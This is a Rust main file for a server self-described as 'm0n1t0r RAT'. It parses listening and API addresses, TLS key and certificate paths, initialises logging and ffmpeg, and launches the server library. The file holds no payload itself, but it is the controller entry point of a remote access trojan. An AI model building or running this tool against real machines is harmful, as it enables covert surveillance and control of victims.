use anyhow::Result;
use clap::Parser;
use flexi_logger::Logger;
use m0n1t0r_server::{Config, ServerMap};
use std::{net::SocketAddr, path::PathBuf, sync::Arc};
use tokio::sync::RwLock;

#[derive(Parser, Debug)]
#[command(version, about = "m0n1t0r RAT")]
struct Arguments {
    #[arg(short, long, default_value = "0.0.0.0:27853")]
    conn_addr: SocketAddr,
    #[arg(short, long, default_value = "0.0.0.0:10801")]
    api_addr: SocketAddr,
    #[arg(short, long)]
    key: PathBuf,
    #[arg(short, long)]
    cert: PathBuf,
    #[arg(short, long, default_value_t = !cfg!(debug_assertions))]
    use_https: bool,
    #[arg(short, long, default_value = "debug")]
    log_level: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Arguments::try_parse()?;

    Logger::try_with_str(&args.log_level)?.start()?;
    ffmpeg_next::init()?;

    let config = Config::new(
        &args.conn_addr,
        &args.api_addr,
        &args.key,
        &args.cert,
        args.use_https,
    )?;
    let server_map = Arc::new(RwLock::new(ServerMap::new()));

    m0n1t0r_server::run(&config, server_map).await?;
    Ok(())
}
